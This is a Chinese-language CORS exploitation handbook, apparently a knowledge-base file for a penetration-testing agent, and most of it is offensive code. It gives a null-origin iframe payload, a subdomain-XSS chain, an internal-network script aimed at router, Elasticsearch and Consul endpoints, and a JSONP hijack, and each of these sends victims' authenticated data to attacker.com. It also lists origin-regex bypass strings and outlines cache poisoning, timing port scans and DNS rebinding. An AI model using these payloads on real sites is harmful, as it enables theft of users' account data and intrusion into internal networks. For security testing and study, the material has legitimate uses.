# CORS 错配利用手册

> CORS（跨域资源共享）错配的完整攻击面: 反射/null origin/正则绕过/Vary 缓存投毒/内网利用/JSONP 劫持。
> 加载时机: 响应含 `Access-Control-Allow-Origin`/`Access-Control-Allow-Credentials`/preflight 头；浏览器攻击路径可能读取认证 API；JSON 端点看似防 CSRF 但跨域可读。

## §1 高价值错配检查表与分诊

| 主题 | 检查什么 |
|---|---|
| wildcard + credentials | `Access-Control-Allow-Origin: *` 配合凭证支持或等价破坏行为 |
| 反射 Origin | 服务端回显任意 Origin |
| 弱白名单 | 后缀/前缀/子串/正则/大小写匹配错误 |
| null origin | 接受 sandbox、file、跨域重定向产生的 null Origin |
| preflight 信任 | 过宽的方法与头允许 |
| 内部 API 暴露 | 管理员/租户数据可跨域读取 |

分诊四步: ①发构造 Origin 看反射 → ②带/不带凭证分别测 → ③攻击者子域+解析器边界探白名单绕过 → ④可读数据敏感则链到账号/租户影响。

## §2 null Origin 利用

**Origin: null 五种产生场景**: sandbox iframe（`<iframe sandbox>`）/ `data:` URI / `file:` 本地 HTML / 跨域重定向链（部分浏览器）/ opaque origin 的 `blob:` URL。

利用（白名单含 null 或反射 null 时）:
```html
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<script>
fetch('https://target.com/api/user/profile', {credentials:'include'})
  .then(r=>r.json())
  .then(d=>fetch('https://attacker.com/log?data='+btoa(JSON.stringify(d))));
</script>"></iframe>
```
检测: `curl -H "Origin: null"` 看 ACAO 是否回显 null。

## §3 Vary: Origin 缺失 → CORS 缓存投毒

服务端反射 Origin 但响应**不含 `Vary: Origin`** → 中间缓存把同一响应发给不同 Origin:
1. 攻击者发 `Origin: https://attacker.com` → 响应缓存（ACAO: attacker.com）
2. 受害者请求同一 URL → 缓存返回带攻击者 ACAO 的响应
3. 攻击者页 fetch 该 URL 读取受害者数据

检测（两次 curl 对比）:
```bash
curl -H "Origin: https://evil.com" https://target.com/api/data -I
curl -H "Origin: https://target.com" https://target.com/api/data -I
# 两次 ACAO 都是 evil.com → 缓存投毒，Vary: Origin 缺失
```
修复验证: 响应含 `Vary: Origin`；缓存键含 Origin 头；或 ACAO 硬编码不反射。

## §4 Origin 校验正则绕过

| 意图模式 | 缺陷 | 绕过 Origin |
|---|---|---|
| `^https?://.*\.target\.com$` | `.*` 匹配含 `-` 任意串 | `https://attacker-target.com` |
| `^https?://.*target\.com$` | 子域锚缺失 | `https://nottarget.com`、`https://attacker.com/.target.com` |
| `target\.com`（子串） | 无锚点 | `https://attacker.com?target.com` |
| `^https?://(.*\.)?target\.com$` | 无端口限制 | `https://target.com.attacker.com:443` |
| `^https://[a-z]+\.target\.com$` | 字符类缺 `-/数字` | 合法子域漏报 |
| 回溯型正则 | ReDoS | `https://aaa...aaa.target.com` |

**测试 payload 清单**:
```
https://attacker.com/.target.com
https://target.com.attacker.com
https://attackertarget.com
https://target.com%60attacker.com
https://target.com%2F@attacker.com
https://attacker.com#.target.com
https://attacker.com?.target.com
null
```

**Unicode 归一化绕过**: `https://ⓣarget.com`（同形字）——校验器比较后才归一化而浏览器发原始串（或相反）→ 两边看到的不一致。

## §5 子域 XSS → CORS 链

api.target.com 允许 `*.target.com` + 任一子域 XSS:
```javascript
// 注入到 blog.target.com 的 XSS:
fetch('https://api.target.com/v1/user/profile', {credentials:'include'})
  .then(r=>r.json())
  .then(data => navigator.sendBeacon('https://attacker.com/exfil', JSON.stringify(data)));
```
原理: 子域与主 API 是 same-site（eTLD+1 同）→ SameSite cookie 照发；CORS 白名单放行子域 Origin → 可读。**任一子域 XSS = 完整 API 访问**。

侦察: 枚举子域（amass/subfinder/crt.sh）→ 逐个测 XSS → 查 API 是否接受子域 Origin → 子域接管候选同样可用。
写操作利用（读 token 后提交 CSRF）见 `$AGENT_DIR/knowledge-base/csrf-clickjacking.md` §8。

## §6 内网 API CORS 利用

内网 API 常配 `ACAO: *`（"只有内网用户能访问"）→ 受害者（内网员工）浏览器被外部页面当跳板:
```javascript
const internalAPIs = [
  'http://192.168.1.1/admin/config',        // 路由器
  'http://10.0.0.1:8080/api/users',
  'http://172.16.0.1:9200/_cat/indices',    // Elasticsearch
  'http://localhost:8500/v1/agent/members', // Consul
];
internalAPIs.forEach(url => fetch(url)
  .then(r=>r.text())
  .then(d=>navigator.sendBeacon('https://attacker.com/exfil', JSON.stringify({url,d})))
  .catch(()=>{}));
```

**CORS timing 端口扫描**（无 `ACAO: *` 也能用）: 端口开放 → CORS 错误（时序特征）；端口关闭 → 快速错误；主机不在线 → 超时慢错误。按错误时间差推断内网服务。

**DNS rebinding 组合**（绕 SOP 完整读取）: attacker.com TTL=0/1 → 首解析攻击者 IP（服务恶意 JS）→ 次解析内网 IP → 页面 fetch attacker.com/admin 实际命中内网 → 同源满足（域名同）→ 响应可读。

## §7 JSONP 劫持

机制: JSONP 把数据包进函数调用，`<script>` 标签跨域读取；不校验 Referer/Origin 即可劫持。
```html
<script>function stolen(data){fetch('https://attacker.com/collect',{method:'POST',body:JSON.stringify(data)});}</script>
<script src="https://target.com/api/userinfo?callback=stolen"></script>
```

**水坑攻击**: 热门站嵌入多个目标站 JSONP 请求，受害者访问时浏览器向各目标发认证请求，数据统一回调外带。
**蜜罐去匿名化**（防守视角）: 蜜罐页嵌入社交平台 JSONP 端点，已登录访问者的 profile 被回调 → 身份暴露。
**自动化挖掘三件套**: ①Selenium 自动遍历点击页面按钮/链接覆盖更多接口 ②代理（Fiddler/bp）过滤记录所有含敏感字段的 JSONP 请求 ③验证脚本剔除 Referer 重放——仍返回敏感信息即存在劫持（Referer 校验缺陷两型: 子域后缀正则不严 `target.com.attacker.com` 绕过/空 Referer 直删）。

**CORS vs JSONP**: JSONP 仅 GET、无错误处理、始终带 cookie；CORS 任意方法、可捕获错误、需 `credentials: include` + 服务端允许。防御: 校验 Referer/Origin + callback 参数名白名单；长期用规范 CORS 替代 JSONP。

## §8 前置: 同源策略与 document.domain

同源 = 协议 + 主机 + 端口全同（任一不同即跨源，含子域）。

`document.domain` 放松: 两页都设 `document.domain = "a.com"` 可跨子域互访 DOM。风险: 任一子域 XSS → 访问所有同样放松的子域 → 单子域失陷扩散。评估子域 XSS 影响时检查其他子域是否用 document.domain。

## §9 关联文件

- `$AGENT_DIR/knowledge-base/csrf-clickjacking.md` — §5 读 CSRF token 的写操作链、§8 CSRF+CORS
- `$AGENT_DIR/knowledge-base/cache-poisoning.md` — Vary 头通用机制与缓存键
- `$AGENT_DIR/knowledge-base/web-vulnerabilities.md` — §2.3 速查
